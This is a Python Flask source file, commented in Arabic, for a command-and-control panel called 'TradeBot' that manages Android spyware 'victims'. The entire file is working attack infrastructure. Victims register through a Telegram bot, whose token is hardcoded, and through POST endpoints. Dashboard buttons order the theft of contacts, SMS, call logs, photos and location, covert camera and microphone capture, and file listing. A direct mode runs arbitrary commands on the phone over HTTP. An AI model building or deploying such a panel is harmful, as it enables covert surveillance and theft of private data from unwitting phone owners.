from flask import Flask, render_template_string, request, jsonify
import requests
import json
import time
import re
import threading
from datetime import datetime

app = Flask(__name__)

BOT_TOKEN = "8161789676:AAEZIz_8ilIZUPpG7lvj37UnEt1WHInZkKA"
CHAT_ID = "7810572372"

# ✅ قائمة الضحايا
victims = {}
selected_victim = None
command_results = {}

# ============================================================
# ✅ ✅ ✅ تحديث قائمة الضحايا من رسائل Telegram ✅ ✅ ✅
# ============================================================
def update_victims_list():
    global victims
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?limit=100"
        response = requests.get(url, timeout=30)
        data = response.json()
        
        if data["ok"]:
            for update in data["result"]:
                if "message" in update and "text" in update["message"]:
                    text = update["message"]["text"]
                    chat_id = str(update["message"]["chat"]["id"])
                    
                    device_id = None
                    device_name = None
                    
                    match = re.search(r'[a-fA-F0-9]{16}', text)
                    if match:
                        device_id = match.group(0)
                    
                    for line in text.split("\n"):
                        if "الجهاز" in line or "📱" in line:
                            parts = line.split(":")
                            if len(parts) > 1:
                                device_name = parts[1].strip()
                                break
                    
                    if device_id and len(device_id) > 5:
                        # ✅ الحفاظ على IP إذا كان موجوداً مسبقاً
                        old_ip = victims.get(chat_id, {}).get("device_ip", None)
                        victims[chat_id] = {
                            "device_id": device_id,
                            "device_name": device_name or "جهاز غير معروف",
                            "last_seen": time.time(),
                            "status": "online",
                            "device_ip": old_ip  # ✅ الحفاظ على IP القديم
                        }
                        print(f"✅ تم إضافة الضحية: {device_name} ({device_id})")
                    
                    elif chat_id in victims:
                        victims[chat_id]["last_seen"] = time.time()
                        victims[chat_id]["status"] = "online"
        
        current_time = time.time()
        to_remove = []
        for chat_id, data in victims.items():
            if current_time - data.get("last_seen", 0) > 86400:
                to_remove.append(chat_id)
        for chat_id in to_remove:
            del victims[chat_id]
            print(f"🗑️ تم حذف ضحية غير نشطة: {chat_id}")
            
        return victims
    except Exception as e:
        print(f"❌ خطأ في تحديث الضحايا: {e}")
        return victims

# ============================================================
# ✅ ✅ ✅ إرسال أمر عبر Telegram (الطريقة القديمة) ✅ ✅ ✅
# ============================================================
def send_command_to_victim(chat_id, command):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        params = {
            "chat_id": chat_id,
            "text": f"/{command}"
        }
        response = requests.post(url, params=params, timeout=30)
        if response.status_code == 200:
            return f"✅ تم إرسال /{command} إلى الهدف (عبر Telegram)"
        else:
            return f"❌ فشل الإرسال: {response.status_code}"
    except Exception as e:
        return f"❌ خطأ: {str(e)}"

# ============================================================
# ✅ ✅ ✅ إرسال أمر مباشر إلى IP الجهاز (الطريقة الجديدة) ✅ ✅ ✅
# ============================================================
def send_command_direct(device_ip, command):
    """إرسال أمر مباشر إلى خادم الويب على هاتف الضحية"""
    try:
        # ✅ تنظيف الأمر (إزالة / إذا وجدت)
        clean_command = command
        if clean_command.startswith("/"):
            clean_command = clean_command[1:]
        
        url = f"http://{device_ip}:8080/api/execute?cmd={clean_command}"
        print(f"📤 Sending direct command to: {url}")
        
        response = requests.get(url, timeout=15)
        
        if response.status_code == 200:
            return f"✅ تم تنفيذ الأمر مباشرة على الجهاز ({device_ip})\n\n{response.text}"
        else:
            return f"❌ فشل التنفيذ المباشر: {response.status_code}\n{response.text}"
            
    except requests.exceptions.Timeout:
        return f"❌ انتهى الوقت: الجهاز {device_ip} لا يستجيب"
    except requests.exceptions.ConnectionError:
        return f"❌ خطأ في الاتصال: لا يمكن الوصول إلى {device_ip}"
    except Exception as e:
        return f"❌ خطأ: {str(e)}"

# ============================================================
# ✅ ✅ ✅ إرسال أمر مع معاملات ✅ ✅ ✅
# ============================================================
def send_command_with_param(chat_id, command, param):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        params = {
            "chat_id": chat_id,
            "text": f"/{command} {param}"
        }
        response = requests.post(url, params=params, timeout=30)
        if response.status_code == 200:
            return f"✅ تم إرسال /{command} {param} إلى الهدف"
        else:
            return f"❌ فشل الإرسال: {response.status_code}"
    except Exception as e:
        return f"❌ خطأ: {str(e)}"

# ============================================================
# ✅ ✅ ✅ HTML (واجهة محسّنة مع دعم IP) ✅ ✅ ✅
# ============================================================
HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة تحكم TradeBot</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0e17; color: #e0e0e0; font-family: 'Segoe UI', Arial, sans-serif; padding: 20px; min-height: 100vh; }
        .container { max-width: 1100px; margin: auto; }
        
        .header {
            background: linear-gradient(135deg, #0f1a2e, #1a2a4e);
            padding: 15px 20px;
            border-radius: 12px;
            margin-bottom: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border: 1px solid #1a3a6e;
        }
        .header h1 { color: #00d4ff; font-size: 24px; font-weight: 700; }
        .header .status-badge { background: #1a3a6e; padding: 5px 15px; border-radius: 20px; font-size: 12px; color: #44ff88; }
        
        .sidebar {
            float: left;
            width: 280px;
            background: #0f1a2e;
            padding: 15px;
            border-radius: 12px;
            border: 1px solid #1a3a6e;
            max-height: 600px;
            overflow-y: auto;
        }
        .sidebar h4 { color: #00d4ff; margin-bottom: 10px; font-size: 14px; }
        .sidebar .count { color: #666; font-size: 12px; }
        
        .victim-item {
            background: #1a2a4e;
            padding: 10px 12px;
            margin: 6px 0;
            border-radius: 8px;
            cursor: pointer;
            border-left: 3px solid #2a4a6e;
            transition: all 0.3s;
        }
        .victim-item:hover { background: #2a4a6e; }
        .victim-item.selected { border-left-color: #00d4ff; background: #1a3a6e; }
        .victim-item .name { color: #00d4ff; font-weight: bold; font-size: 14px; }
        .victim-item .id { color: #666; font-size: 10px; display: block; }
        .victim-item .ip { color: #44ff88; font-size: 11px; display: block; font-family: monospace; }
        .victim-item .status-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; }
        .victim-item .status-dot.online { background: #44ff88; }
        .victim-item .status-dot.offline { background: #ff4444; }
        .victim-item .badge-direct { background: #00d4ff; color: #000; padding: 1px 8px; border-radius: 10px; font-size: 9px; font-weight: bold; margin-left: 5px; }
        
        .main { margin-left: 300px; }
        
        .target-info {
            background: #0f1a2e;
            padding: 10px 15px;
            border-radius: 8px;
            border: 1px solid #1a3a6e;
            margin-bottom: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
        }
        .target-info .target-name { color: #44ff88; font-weight: bold; }
        .target-info .target-id { color: #666; font-size: 12px; }
        .target-info .target-ip { color: #00d4ff; font-size: 12px; font-family: monospace; }
        
        .btn-group {
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
            margin-bottom: 10px;
        }
        .btn {
            padding: 7px 12px;
            border: none;
            border-radius: 6px;
            font-size: 11px;
            cursor: pointer;
            transition: all 0.2s;
            font-weight: 600;
        }
        .btn:hover { opacity: 0.8; transform: scale(0.97); }
        .btn-primary { background: #00d4ff; color: #000; }
        .btn-success { background: #44ff88; color: #000; }
        .btn-danger { background: #ff4444; color: #fff; }
        .btn-warning { background: #ffaa00; color: #000; }
        .btn-purple { background: #9b59b6; color: #fff; }
        .btn-info { background: #00bcd4; color: #fff; }
        .btn-pink { background: #e91e63; color: #fff; }
        .btn-secondary { background: #2a4a6e; color: #fff; }
        .btn-orange { background: #ff6f00; color: #fff; }
        .btn-cyan { background: #00acc1; color: #fff; }
        .btn-direct { background: #ff4444; color: #fff; border: 1px solid #ff6666; }
        
        .result-box {
            background: #0f1a2e;
            padding: 15px;
            border-radius: 12px;
            min-height: 150px;
            border: 1px solid #1a3a6e;
            margin-top: 10px;
        }
        .result-box pre {
            white-space: pre-wrap;
            font-family: 'Consolas', monospace;
            font-size: 12px;
            color: #e0e0e0;
            margin: 0;
            max-height: 400px;
            overflow: auto;
        }
        .result-box .timestamp { color: #666; font-size: 10px; margin-bottom: 8px; }
        
        .cmd-input {
            background: #0f1a2e;
            padding: 10px;
            border-radius: 8px;
            border: 1px solid #1a3a6e;
            margin-top: 8px;
            display: flex;
            gap: 8px;
        }
        .cmd-input input {
            flex: 1;
            background: #1a2a4e;
            border: 1px solid #2a4a6e;
            padding: 8px 12px;
            border-radius: 6px;
            color: #e0e0e0;
            outline: none;
        }
        .cmd-input input:focus { border-color: #00d4ff; }
        .cmd-input button { background: #00d4ff; color: #000; border: none; padding: 8px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; }
        
        .method-toggle {
            display: flex;
            gap: 10px;
            margin: 8px 0;
            align-items: center;
        }
        .method-toggle label {
            font-size: 12px;
            color: #8B8B8B;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        .method-toggle input[type="radio"] {
            accent-color: #00d4ff;
            width: 16px;
            height: 16px;
        }
        .method-toggle .active-method {
            color: #00d4ff;
            font-weight: bold;
        }
        
        .clear { clear: both; }
        .sidebar::-webkit-scrollbar { width: 4px; }
        .sidebar::-webkit-scrollbar-track { background: #0f1a2e; }
        .sidebar::-webkit-scrollbar-thumb { background: #1a3a6e; border-radius: 4px; }
        
        @media (max-width: 700px) {
            .sidebar { float: none; width: 100%; max-height: 200px; margin-bottom: 15px; }
            .main { margin-left: 0; }
            .btn-group .btn { flex: 1; min-width: 50px; text-align: center; }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🤖 لوحة تحكم TradeBot</h1>
        <span class="status-badge">🟢 متصل</span>
    </div>
    
    <div class="sidebar">
        <h4>📱 الضحايا <span class="count" id="victimCount">(0)</span></h4>
        <div id="victims-list"></div>
        <button class="btn btn-secondary" onclick="refreshVictims()" style="width:100%;margin-top:8px;">🔄 تحديث</button>
        <div style="margin-top:8px;font-size:10px;color:#444;text-align:center;">
            آخر تحديث: <span id="lastUpdate">-</span>
        </div>
    </div>
    
    <div class="main">
        <div class="target-info">
            <div>
                <span class="target-name" id="targetName">❌ لم يتم اختيار ضحية</span>
                <span class="target-id" id="targetId"></span>
                <span class="target-ip" id="targetIp"></span>
            </div>
            <span style="color:#666;font-size:12px;" id="targetStatus">⚪ غير معروف</span>
        </div>
        
        <div class="method-toggle">
            <label>
                <input type="radio" name="method" value="telegram" checked onchange="toggleMethod()">
                📡 عبر Telegram
            </label>
            <label>
                <input type="radio" name="method" value="direct" onchange="toggleMethod()">
                ⚡ مباشر (IP)
            </label>
            <span id="methodStatus" style="color:#666;font-size:11px;margin-left:10px;">✅ جاهز</span>
        </div>
        
        <div class="btn-group">
            <button class="btn btn-primary" onclick="sendCommand('contacts')">📇 جهات</button>
            <button class="btn btn-primary" onclick="sendCommand('sms')">📩 رسائل</button>
            <button class="btn btn-primary" onclick="sendCommand('calls')">📞 مكالمات</button>
            <button class="btn btn-primary" onclick="sendCommand('images')">🖼️ صور</button>
            <button class="btn btn-success" onclick="sendCommand('export-images')">📤 جميع الصور</button>
            <button class="btn btn-warning" onclick="sendCommand('location')">📍 موقع</button>
            <button class="btn btn-purple" onclick="sendCommand('device')">📱 جهاز</button>
            <button class="btn btn-danger" onclick="sendCommand('grab')">💾 جمع الكل</button>
            <button class="btn btn-success" onclick="sendCommand('camera')">📷 كاميرا</button>
            <button class="btn btn-pink" onclick="sendCommand('selfie')">🤳 سيلفي</button>
            <button class="btn btn-warning" onclick="sendCommand('record')">🎙️ تسجيل</button>
            <button class="btn btn-info" onclick="sendCommand('listdir')">📂 ملفات</button>
            <button class="btn btn-secondary" onclick="sendCommand('help')">🆘 مساعدة</button>
            <button class="btn btn-orange" onclick="sendCommand('status')">📊 حالة</button>
            <button class="btn btn-cyan" onclick="sendCommand('apps')">📱 تطبيقات</button>
        </div>
        
        <div class="cmd-input">
            <input type="text" id="customCmd" placeholder="أدخل أمر مخصص... (مثال: listdir /storage/emulated/0)" />
            <button onclick="sendCustomCommand()">▶️ تنفيذ</button>
        </div>
        
        <div class="result-box" id="resultBox">
            <div class="timestamp" id="resultTimestamp"></div>
            <pre id="resultContent">اختر ضحية ثم اضغط على أمر</pre>
        </div>
    </div>
    <div class="clear"></div>
</div>

<script>
var selectedVictim = null;
var victimData = {};
var autoRefreshInterval = null;
var useDirectMethod = false;

function toggleMethod() {
    var radios = document.getElementsByName('method');
    for (var i = 0; i < radios.length; i++) {
        if (radios[i].checked) {
            useDirectMethod = (radios[i].value === 'direct');
            document.getElementById('methodStatus').innerText = useDirectMethod ? '⚡ وضع مباشر' : '📡 وضع Telegram';
            document.getElementById('methodStatus').style.color = useDirectMethod ? '#44ff88' : '#00d4ff';
            break;
        }
    }
}

function refreshVictims() {
    var listDiv = document.getElementById('victims-list');
    listDiv.innerHTML = '⏳ جاري التحميل...';
    fetch('/get_victims')
        .then(function(response) { return response.json(); })
        .then(function(data) {
            var html = '';
            var count = 0;
            victimData = data;
            for (var chatId in data) {
                if (data.hasOwnProperty(chatId)) {
                    count++;
                    var v = data[chatId];
                    var isSelected = (chatId === selectedVictim) ? 'selected' : '';
                    var statusClass = (v.status === 'online') ? 'online' : 'offline';
                    var ipDisplay = v.device_ip && v.device_ip !== 'unknown' ? 
                        '🌐 ' + v.device_ip : '❌ لا يوجد IP';
                    var directBadge = (v.device_ip && v.device_ip !== 'unknown') ? 
                        '<span class="badge-direct">مباشر</span>' : '';
                    
                    html += '<div class="victim-item ' + isSelected + '" onclick="selectVictim(&quot;' + chatId + '&quot;)">';
                    html += '<span class="status-dot ' + statusClass + '"></span>';
                    html += '<span class="name">' + v.device_name + '</span>' + directBadge;
                    html += '<span class="id">🆔 ' + v.device_id + '</span>';
                    html += '<span class="ip">' + ipDisplay + '</span>';
                    html += '</div>';
                }
            }
            if (count === 0) {
                html = '<div style="color:#666;padding:10px;text-align:center;">📭 لا يوجد ضحايا</div>';
            }
            listDiv.innerHTML = html;
            document.getElementById('victimCount').innerText = '(' + count + ')';
            document.getElementById('lastUpdate').innerText = new Date().toLocaleTimeString('ar-EG');
            
            if (selectedVictim && victimData[selectedVictim]) {
                selectVictim(selectedVictim);
            }
        })
        .catch(function(err) {
            listDiv.innerHTML = '❌ خطأ في تحميل الضحايا';
            console.error(err);
        });
}

function selectVictim(chatId) {
    selectedVictim = chatId;
    var v = victimData[chatId];
    if (v) {
        document.getElementById('targetName').innerText = v.device_name;
        document.getElementById('targetId').innerText = '🆔 ' + v.device_id;
        document.getElementById('targetIp').innerText = v.device_ip && v.device_ip !== 'unknown' ? 
            ' 🌐 ' + v.device_ip : ' ❌ لا يوجد IP';
        document.getElementById('targetStatus').innerHTML = (v.status === 'online') ? '🟢 متصل' : '🔴 غير متصل';
        
        var items = document.querySelectorAll('.victim-item');
        items.forEach(function(item) {
            item.classList.remove('selected');
            if (item.innerText.includes(v.device_id)) {
                item.classList.add('selected');
            }
        });
        
        document.getElementById('resultContent').innerText = '✅ تم اختيار الضحية: ' + v.device_name;
        document.getElementById('resultTimestamp').innerText = new Date().toLocaleTimeString('ar-EG');
    } else {
        document.getElementById('targetName').innerText = '❌ غير معروف';
        document.getElementById('targetId').innerText = '';
        document.getElementById('targetIp').innerText = '';
        document.getElementById('targetStatus').innerHTML = '⚪ غير معروف';
    }
}

function sendCommand(cmd) {
    if (!selectedVictim) {
        document.getElementById('resultContent').innerText = '⚠️ يرجى اختيار ضحية أولاً';
        document.getElementById('resultTimestamp').innerText = new Date().toLocaleTimeString('ar-EG');
        return;
    }
    
    var v = victimData[selectedVictim];
    var result = document.getElementById('resultContent');
    var timestamp = document.getElementById('resultTimestamp');
    
    // ✅ إذا كان الوضع المباشر مفعلاً والضحية لديها IP
    if (useDirectMethod && v && v.device_ip && v.device_ip !== 'unknown') {
        result.textContent = '⚡ جاري الإرسال مباشرة إلى ' + v.device_ip + '...';
        timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
        
        fetch('/send_direct/' + cmd + '/' + v.device_ip)
            .then(function(response) { return response.text(); })
            .then(function(data) {
                result.textContent = data;
                timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
            })
            .catch(function(err) {
                result.textContent = '❌ خطأ: ' + err;
                timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
            });
    } else {
        // ✅ الطريقة العادية عبر Telegram
        if (useDirectMethod) {
            result.textContent = '⚠️ الضحية لا يوجد لها IP، سيتم الإرسال عبر Telegram';
            timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
        }
        
        result.textContent = '📡 جاري إرسال /' + cmd + ' عبر Telegram...';
        timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
        
        fetch('/send/' + cmd + '/' + selectedVictim)
            .then(function(response) { return response.text(); })
            .then(function(data) {
                result.textContent = data;
                timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
            })
            .catch(function(err) {
                result.textContent = '❌ خطأ: ' + err;
                timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
            });
    }
}

function sendCustomCommand() {
    var input = document.getElementById('customCmd');
    var cmd = input.value.trim();
    if (!cmd) {
        alert('⚠️ يرجى إدخال أمر');
        return;
    }
    
    if (!selectedVictim) {
        document.getElementById('resultContent').innerText = '⚠️ يرجى اختيار ضحية أولاً';
        document.getElementById('resultTimestamp').innerText = new Date().toLocaleTimeString('ar-EG');
        return;
    }
    
    var v = victimData[selectedVictim];
    var result = document.getElementById('resultContent');
    var timestamp = document.getElementById('resultTimestamp');
    
    // ✅ إزالة / من بداية الأمر إذا وجدت
    var cleanCmd = cmd;
    if (cleanCmd.startsWith('/')) {
        cleanCmd = cleanCmd.substring(1);
    }
    
    if (useDirectMethod && v && v.device_ip && v.device_ip !== 'unknown') {
        result.textContent = '⚡ جاري الإرسال مباشرة إلى ' + v.device_ip + '...';
        timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
        
        fetch('/send_direct/' + cleanCmd + '/' + v.device_ip)
            .then(function(response) { return response.text(); })
            .then(function(data) {
                result.textContent = data;
                timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
                input.value = '';
            })
            .catch(function(err) {
                result.textContent = '❌ خطأ: ' + err;
                timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
            });
    } else {
        if (useDirectMethod) {
            result.textContent = '⚠️ الضحية لا يوجد لها IP، سيتم الإرسال عبر Telegram';
            timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
        }
        
        result.textContent = '📡 جاري إرسال /' + cmd + ' عبر Telegram...';
        timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
        
        fetch('/send_custom/' + selectedVictim + '?cmd=' + encodeURIComponent(cmd))
            .then(function(response) { return response.text(); })
            .then(function(data) {
                result.textContent = data;
                timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
                input.value = '';
            })
            .catch(function(err) {
                result.textContent = '❌ خطأ: ' + err;
                timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
            });
    }
}

function toggleMethod() {
    var radios = document.getElementsByName('method');
    for (var i = 0; i < radios.length; i++) {
        if (radios[i].checked) {
            useDirectMethod = (radios[i].value === 'direct');
            document.getElementById('methodStatus').innerText = useDirectMethod ? '⚡ وضع مباشر' : '📡 وضع Telegram';
            document.getElementById('methodStatus').style.color = useDirectMethod ? '#44ff88' : '#00d4ff';
            break;
        }
    }
}

window.onload = function() {
    refreshVictims();
    autoRefreshInterval = setInterval(refreshVictims, 15000);
    toggleMethod();
};

document.addEventListener('DOMContentLoaded', function() {
    var input = document.getElementById('customCmd');
    input.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            sendCustomCommand();
        }
    });
});
</script>
</body>
</html>
"""

# ============================================================
# ✅ ✅ ✅ Routes (المسارات) ✅ ✅ ✅
# ============================================================

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/get_victims')
def get_victims():
    update_victims_list()
    result = {}
    for chat_id, data in victims.items():
        result[chat_id] = {
            "device_id": data["device_id"],
            "device_name": data["device_name"],
            "status": data.get("status", "unknown"),
            "last_seen": data.get("last_seen", 0),
            "device_ip": data.get("device_ip", "unknown")  # ✅ ✅ ✅ إضافة IP ✅ ✅ ✅
        }
    return jsonify(result)

# ============================================================
# ✅ ✅ ✅ إرسال أمر عبر Telegram (الطريقة القديمة) ✅ ✅ ✅
# ============================================================
@app.route('/send/<command>/<chat_id>')
def send_command(command, chat_id):
    if chat_id not in victims:
        return f"❌ الضحية غير موجودة: {chat_id}"
    
    result = send_command_to_victim(chat_id, command)
    return result

# ============================================================
# ✅ ✅ ✅ إرسال أمر مخصص عبر Telegram ✅ ✅ ✅
# ============================================================
@app.route('/send_custom/<chat_id>')
def send_custom_command(chat_id):
    if chat_id not in victims:
        return f"❌ الضحية غير موجودة: {chat_id}"
    
    cmd = request.args.get('cmd', '')
    if not cmd:
        return "❌ يرجى تحديد أمر"
    
    result = send_command_to_victim(chat_id, cmd)
    return result

# ============================================================
# ✅ ✅ ✅ إرسال أمر مع معاملات ✅ ✅ ✅
# ============================================================
@app.route('/send_with_param/<command>/<chat_id>')
def send_command_with_param_route(command, chat_id):
    if chat_id not in victims:
        return f"❌ الضحية غير موجودة: {chat_id}"
    
    param = request.args.get('param', '')
    if not param:
        return "❌ يرجى تحديد معامل"
    
    result = send_command_with_param(chat_id, command, param)
    return result

# ============================================================
# ✅ ✅ ✅ إرسال أمر مباشر إلى IP (الطريقة الجديدة) ✅ ✅ ✅
# ============================================================
@app.route('/send_direct/<command>/<device_ip>')
def send_direct_command(command, device_ip):
    """إرسال أمر مباشر إلى خادم الويب على هاتف الضحية"""
    try:
        # ✅ التحقق من صحة IP
        if device_ip == "unknown" or not device_ip:
            return "❌ IP غير صالح للضحية"
        
        result = send_command_direct(device_ip, command)
        return result
        
    except Exception as e:
        return f"❌ خطأ: {str(e)}"

# ============================================================
# ✅ ✅ ✅ استقبال ضحية جديدة من تطبيق Android ✅ ✅ ✅
# ============================================================
@app.route('/api/new_victim', methods=['POST'])
def new_victim():
    """استقبال ضحية جديدة من تطبيق Android"""
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        device_name = data.get('device_name')
        chat_id = data.get('chat_id')
        device_ip = data.get('device_ip', 'unknown')  # ✅ ✅ ✅ استقبال IP ✅ ✅ ✅
        
        if not device_id or not chat_id:
            return jsonify({
                "status": "error", 
                "message": "Missing device_id or chat_id"
            }), 400
        
        # ✅ تخزين الضحية مع IP
        victims[chat_id] = {
            "device_id": device_id,
            "device_name": device_name or "جهاز غير معروف",
            "status": "online",
            "last_seen": time.time(),
            "device_ip": device_ip  # ✅ ✅ ✅ تخزين IP ✅ ✅ ✅
        }
        
        print(f"✅ تم تسجيل ضحية جديدة من Android: {device_name} ({device_id})")
        print(f"🌐 IP: {device_ip}")
        print(f"📊 عدد الضحايا الآن: {len(victims)}")
        
        return jsonify({
            "status": "ok",
            "message": f"Victim {device_name} registered successfully"
        })
        
    except Exception as e:
        print(f"❌ خطأ في تسجيل الضحية: {e}")
        return jsonify({
            "status": "error",
            "message": str(e)
        }), 500

# ============================================================
# ✅ ✅ ✅ تحديث IP الجهاز ✅ ✅ ✅
# ============================================================
@app.route('/api/update_device_ip', methods=['POST'])
def update_device_ip():
    """تحديث IP الجهاز"""
    try:
        data = request.get_json()
        device_ip = data.get('device_ip')
        chat_id = data.get('chat_id')
        device_id = data.get('device_id')
        
        if not device_ip or not chat_id:
            return jsonify({"status": "error", "message": "Missing data"}), 400
        
        # ✅ تحديث IP للضحية
        if chat_id in victims:
            victims[chat_id]["device_ip"] = device_ip
            victims[chat_id]["last_seen"] = time.time()
            victims[chat_id]["status"] = "online"
            print(f"✅ تم تحديث IP للضحية {chat_id}: {device_ip}")
            return jsonify({"status": "ok", "message": "IP updated"})
        else:
            # ✅ إذا كانت الضحية غير موجودة، أضفها
            victims[chat_id] = {
                "device_id": device_id or "unknown",
                "device_name": "جهاز غير معروف",
                "status": "online",
                "last_seen": time.time(),
                "device_ip": device_ip
            }
            print(f"✅ تم إضافة ضحية جديدة مع IP: {device_ip}")
            return jsonify({"status": "ok", "message": "Victim added with IP"})
            
    except Exception as e:
        print(f"❌ خطأ في تحديث IP: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

# ============================================================
# ✅ ✅ ✅ تحديث الهدف من جهاز Android ✅ ✅ ✅
# ============================================================
@app.route('/api/update_target', methods=['POST'])
def update_target():
    """استقبال تحديث الهدف من جهاز Android"""
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        chat_id = data.get('chat_id')
        target_id = data.get('target_id')
        
        if chat_id in victims:
            victims[chat_id]['target'] = target_id
            print(f"🎯 تم تحديث الهدف للضحية {chat_id}: {target_id}")
        
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

# ============================================================
# ✅ ✅ ✅ استقبال نتيجة الأمر من جهاز Android ✅ ✅ ✅
# ============================================================
@app.route('/api/command_result', methods=['POST'])
def command_result():
    """استقبال نتيجة الأمر من جهاز Android"""
    try:
        data = request.get_json()
        command = data.get('command')
        result = data.get('result')
        device_id = data.get('device_id')
        chat_id = data.get('chat_id')
        
        command_results[chat_id] = {
            "command": command,
            "result": result,
            "time": time.time()
        }
        
        print(f"📥 نتيجة الأمر {command} من {chat_id}: {result[:100]}...")
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

# ============================================================
# ✅ ✅ ✅ جلب نتيجة الأمر الأخير ✅ ✅ ✅
# ============================================================
@app.route('/api/get_command_result/<chat_id>')
def get_command_result(chat_id):
    """جلب نتيجة الأمر الأخير"""
    if chat_id in command_results:
        return jsonify(command_results[chat_id])
    return jsonify({"error": "no result"})

# ============================================================
# ✅ ✅ ✅ تشغيل الخادم ✅ ✅ ✅
# ============================================================
if __name__ == '__main__':
    print("🚀 تشغيل لوحة التحكم على https://tradebot-panel.onrender.com")
    print("📱 انتظر حتى يتم تسجيل ضحية جديدة")
    print("⚡ يمكنك الآن التحكم المباشر عبر IP")
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
